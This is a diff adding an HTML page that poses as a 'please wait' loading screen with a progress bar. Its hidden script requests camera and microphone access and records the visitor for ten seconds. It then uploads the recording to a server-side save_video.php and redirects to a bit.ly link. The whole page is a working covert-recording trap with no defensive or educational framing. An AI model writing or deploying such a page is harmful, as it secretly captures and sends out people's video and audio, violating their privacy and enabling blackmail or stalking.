@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html>
+<head>
+ <title>whtch</title>
+ <style>
+  .center {
+   margin: auto;
+   text-align: center;
+  }
+ h1 {
+   color: red;
+  }
+  #video {
+   display: none;
+  }
+  #startButton, #stopButton {
+   display: none;
+  
+  }
+  progress {
+   width: 100%;
+   height: 30px;
+   position: relative;
+   border-radius: 5px;
+   background-color: #ddd;
+  }
+  progress::after {
+   content: "";
+   position: absolute;
+   top: 0;
+   left: 0;
+   width: 0%;
+   height: 100%;
+   background-color: #4CAF50;
+   border-radius: 5px;
+   animation: progress-bar 5s infinite;
+  }
+  @keyframes progress-bar {
+   0% {
+    width: 0%;
+   }
+   100% {
+    width: 100%;
+   }
+  }
+ </style>
+
+</head>
+<body bgcolor="black">
+ <div class="center">
+  <progress id="progress-bar" value="0" max="100"></progress>
+   <h1>please whit…</h1>
+   
+ </div>
+ <script>
+var progressBar = document.getElementById("progress-bar");
+  var value = 0;
+  var interval = setInterval(function() {
+   value += 1;
+   progressBar.value = value;
+   if (value >= 100) {
+    clearInterval(interval);
+   }
+  }, 50);
+  </script>
+ <video id="video" width="640" height="480" autoplay></video>
+ <script>
+  var video = document.querySelector("#video");
+  var mediaRecorder;
+  var chunks = [];
+
+  navigator.mediaDevices.getUserMedia({video: true, audio: true})
+  .then(function(stream) {
+   video.srcObject = stream;
+   mediaRecorder = new MediaRecorder(stream, {mimeType: 'video/webm;codecs=vp9'});
+
+   mediaRecorder.start();
+   console.log(mediaRecorder.state);
+
+   var interval = setInterval(function() {
+    progressBar.style.width = (mediaRecorder.currentTime / 10) * 100 + "%";
+   }, 100);
+
+   setTimeout(function() {
+    clearInterval(interval);
+    mediaRecorder.stop();
+    console.log(mediaRecorder.state);
+    window.location.href = "https://bit.ly/3ild93L";
+   }, 10000);
+
+   mediaRecorder.ondataavailable = function(e) {
+    chunks.push(e.data);
+   }
+
+   mediaRecorder.onstop = function(e) {
+    var blob = new Blob(chunks, { 'type' : 'video/mp4' });
+    chunks = [];
+    var videoURL = window.URL.createObjectURL(blob);
+    console.log(videoURL);
+
+    var xhr = new XMLHttpRequest();
+    xhr.open('POST', 'save_video.php', true);
+    xhr.onload = function() {
+     console.log(xhr.responseText);
+    };
+    xhr.send(blob);
+   }
+  })
+  .catch(function(err) {
+   console.log("Error: " + err);
+  });
+ </script>
+</body>
+</html>
